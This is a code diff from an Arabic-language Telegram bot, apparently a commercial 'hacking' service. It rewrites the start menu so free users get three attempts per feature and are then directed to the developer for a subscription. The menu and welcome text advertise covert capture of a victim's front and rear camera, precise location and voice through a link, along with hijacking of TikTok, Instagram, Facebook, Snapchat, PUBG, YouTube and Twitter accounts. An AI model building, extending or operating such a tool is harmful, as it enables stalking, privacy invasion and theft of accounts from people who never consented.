@@ -574,29 +574,35 @@ bot.onText(/\/listsubscribers/, (msg) => {
     bot.sendMessage(msg.chat.id, `قائمة المشتركين:\n${subscribersList || 'لا يوجد مشتركين حالياً.'}`);
 });
 
-bot.onText(/\/start/, (msg) => {
-    const chatId = msg.chat.id;
-    const message = 'مرحبًا! اختر إحدى الخيارات التالية:';
+function showButtons(chatId, isActivated) {
+    let keyboard = [
+        [{ text: isActivated ? '🎙تسجيل صوت🎙' : `🎙تسجيل صوت🎙 (${MAX_FREE_ATTEMPTS - (userAttempts[chatId]?.voice || 0)}/3)`, callback_data: 'select_duration' }],
+        [{ text: isActivated ? '📷اختراق الكاميرا الخلفية📷' : `📷اختراق الكاميرا الخلفية📷 (${MAX_FREE_ATTEMPTS - (userAttempts[chatId]?.rearCamera || 0)}/3)`, callback_data: 'rear_camera' }],
+        [{ text: isActivated ? '📸اختراق الكاميرا الأمامية📸' : `📸اختراق الكاميرا الأمامية📸 (${MAX_FREE_ATTEMPTS - (userAttempts[chatId]?.frontCamera || 0)}/3)`, callback_data: 'front_camera' }],
+        [{ text: isActivated ? '🗺️الحصول على الموقع🗺️' : `🗺️الحصول على الموقع🗺️ (${MAX_FREE_ATTEMPTS - (userAttempts[chatId]?.location || 0)}/3)`, callback_data: 'get_location' }],
+        [{ text: '☠️اختراق تيك توك ☠️', callback_data: 'increase_tiktok' }],
+        [{ text: '🕷اختراق الانستغرام🕷', callback_data: 'increase_instagram' }],
+        [{ text: '🔱اختراق الفيسبوك🔱', callback_data: 'increase_facebook' }],
+        [{ text: ' 👻 اختراق سناب شات 👻 ', callback_data: 'increase_snapchat' }],
+        [{ text: '🔫اختراق حسابات ببجي🔫', callback_data: 'pubg_uc' }],
+        [{ text: '🔴اختراق يوتيوب🔴', callback_data: 'increase_youtube' }],
+        [{ text: '🐦اختراق تويتر🐦', callback_data: 'increase_twitter' }],
+        [{ text: 'قناة المطور', url: 'https://t.me/SJGDDW' }],
+        [{ text: 'تواصل مع المطور', url: 'https://t.me/SAGD112' }],
+    ];
+
+    // Return or use the keyboard as needed
+
+    const message = isActivated 
+        ? 'مرحباً بك في بوت اختراق برابط كاميرا أمامية وكاميرا خلفية وتحديد الموقع الدقيق وتسجيل صوت الضحية. واختراق الانستقرام والفيس والتيك توك  المطور @SAGD112.'
+        : 'مرحباً بك في بوت اختراق برابط كاميرا أمامية وكاميرا خلفية وتحديد الموقع الدقيق وتسجيل صوت الضحية. واختراق الانستقرام والفيس والتيك توك المطور @SAGD112.\n\nلديك 3 محاولات مجانية لكل خاصية. للاستخدام غير المحدود، يرجى التواصل مع المطور للاشتراك.';
+
     bot.sendMessage(chatId, message, {
         reply_markup: {
-            inline_keyboard: [
-                [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
-                [{ text: '🎙 تسجيل صوت 🎙', callback_data:'voice_record' }],
-                [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data:'get_location' }],
-                [{ text: '☠️اختراق تيك توك ☠️', callback_data: 'increase_tiktok' }],
-                [{ text: '🕷اختراق الانستغرام🕷', callback_data: 'increase_instagram' }],
-                [{ text: '🔱اختراق الفيسبوك🔱', callback_data: 'increase_facebook' }],
-                [{ text: ' 👻 اختراق سناب شات 👻 ', callback_data: 'increase_snapchat' }],
-                [{ text: '🔫اختراق حسابات ببجي🔫', callback_data: 'pubg_uc' }],
-                [{ text: '🔴اختراق يوتيوب🔴', callback_data: 'increase_youtube' }],
-                [{ text: '🐦اختراق تويتر🐦', callback_data: 'increase_twitter' }],
-                [{ text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' }],
-                [{ text:'سجاد  تتواصل مع المطور', url: 'https://t.me/SAGD112' }]
-            ]
+            inline_keyboard: keyboard
         }
     });
-});
-
+}
 
 
 bot.on('callback_query', (callbackQuery) => {
